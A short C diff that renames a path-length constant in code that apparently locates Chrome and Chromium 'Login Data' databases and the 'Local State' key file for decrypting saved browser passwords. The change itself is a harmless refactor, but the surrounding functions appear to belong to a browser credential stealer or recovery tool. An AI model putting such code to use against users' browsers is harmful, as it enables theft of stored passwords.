@@ -124,8 +124,8 @@ int aead_decrypt(char *cipher_password, int len_cipher_password, char *key, char
 
 int get_json_base64_key(char **b64_key) {
 	char *home = getenv("LOCALAPPDATA");
-	char local_state_path[MAX_PATH];
-	snprintf(local_state_path, MAX_PATH, "%s\\Chromium\\User Data\\Local State", home);
+	char local_state_path[MAX_PATH_SIZE];
+	snprintf(local_state_path, MAX_PATH_SIZE, "%s\\Chromium\\User Data\\Local State", home);
 
 	char *json;
 	if(parse_json(local_state_path, &json) == -1) {
@@ -264,11 +264,11 @@ int get_masterkey(char *login_data_path, char **masterkey) {
 
 int load_chrome_paths(char *chrome_path, char *chrome_login_data_path, char *chromium_path, char *chromium_login_data_path) {
 	char *home = getenv("LOCALAPPDATA");
-	snprintf(chrome_path, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default", home);
-	snprintf(chrome_login_data_path, MAX_PATH, "%s\\Login Data", chrome_path);
-	snprintf(chromium_path, MAX_PATH, "%s\\Chromium\\User Data\\Default", home);
-	snprintf(chromium_login_data_path, MAX_PATH, "%s\\Login Data", chromium_path);
-	//snprintf(brave_path, MAX_PATH, "%s/.config/BraveSoftware/Brave-Browser/Default", home);
+	snprintf(chrome_path, MAX_PATH_SIZE, "%s\\Google\\Chrome\\User Data\\Default", home);
+	snprintf(chrome_login_data_path, MAX_PATH_SIZE, "%s\\Login Data", chrome_path);
+	snprintf(chromium_path, MAX_PATH_SIZE, "%s\\Chromium\\User Data\\Default", home);
+	snprintf(chromium_login_data_path, MAX_PATH_SIZE, "%s\\Login Data", chromium_path);
+	//snprintf(brave_path, MAX_PATH_SIZE, "%s/.config/BraveSoftware/Brave-Browser/Default", home);
 	//snprintf(brave_login_data_path, "%s/Login Data", brave_path);
 	
 	return 1;
